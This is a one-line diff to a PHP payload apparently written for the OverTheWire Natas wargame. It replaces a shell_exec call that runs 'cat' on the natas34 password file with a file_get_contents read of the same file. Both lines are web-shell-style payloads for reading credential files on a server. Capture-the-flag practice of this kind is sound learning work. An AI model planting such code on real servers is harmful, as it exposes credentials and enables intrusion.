@@ -1,1 +1,1 @@
-<?php echo shell_exec ('cat /etc/natas_webpass/natas34'); ?>
+<?php echo file_get_contents('/etc/natas_webpass/natas34'); ?>
